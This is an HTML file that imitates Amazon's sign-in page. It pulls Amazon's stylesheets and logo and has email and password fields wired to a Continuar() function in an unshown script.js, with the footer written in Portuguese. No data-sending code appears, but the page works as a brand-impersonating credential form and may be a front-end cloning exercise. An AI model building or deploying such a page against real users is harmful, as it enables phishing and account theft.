<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <title>Document</title>

    <link rel="stylesheet" href="https://images-na.ssl-images-amazon.com/images/I/21cwI2AAWQL.css?AUIClients/CVFAssets">
    <link rel="stylesheet" href="https://images-na.ssl-images-amazon.com/images/I/01SdjaY0ZsL._RC|31jdWD+JB+L.css,51E5CuE4VpL.css_.css?AUIClients/AuthenticationPortalAssets">
    <link rel="stylesheet" href="https://images-na.ssl-images-amazon.com/images/I/612Yf2yUzML._RC|11Fd9tJOdtL.css,11tfezETfFL.css,31WoRZHct0L.css,31Hhzr7NyHL.css_.css?AUIClients/AmazonUI#not-trident">




</head>
<body>
    <div class="logo">
        <a href="https://logospng.org" target="_blank"><img src="https://logospng.org/download/amazon/logo-amazon-4096.png" /></a>
    </div>
    
    <div class="login-container">
        <div class="login-box">
            
            <h2>Sign-In</h2>
            <form action="#">
                <label for="email">Email or mobile phone number</label>
                <input type="text" id="email" name="email" required  autocomplete="on">

                <label for="senha">Password</label>
                <input type="password" id="senha" name="senha" required  autocomplete="on">

                <button type="submit" class="login-button" onclick="Continuar()">Continue</button>
            </form>
            <p>By continuing, you agree to Amazon's <a href="#">Conditions of Use</a> and <a href="#">Privacy Notice</a>.</p>
            <div class="divider"></div>
            <button class="create-account-button">Create your Amazon account</button>
        </div>
    </div>

    <footer>
        <div class="cabeçalho">
            
                <a href="#">Condições de uso</a>
            
    
            
                <a href="#"> Política de Privacidade</a>
            
    
           
                <a href="#"> Ajuda</a>
            
    
            
                <a href="#"> Cookies</a>
            
    
            
                <a href="#"> Anúncios Baseados em Interesses </a>
            
        </div>
        
        
        
    </footer>
    
    


    <script src="script.js"></script>
</body>
</html>
